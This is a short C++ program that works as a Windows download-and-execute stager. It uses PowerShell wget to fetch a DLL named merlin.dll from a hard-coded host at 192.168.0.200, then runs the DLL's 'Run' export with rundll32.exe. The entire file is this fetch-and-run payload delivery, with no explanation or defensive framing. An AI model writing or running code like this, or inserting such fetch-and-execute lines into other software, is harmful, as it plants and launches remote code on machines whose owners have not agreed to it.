#include <fstream>
#include <iostream>
using namespace std;

int main()
{
     system("powershell wget http://192.168.0.200/merlin.dll -o merlin.dll");
     system("rundll32.exe merlin.dll,Run");
}
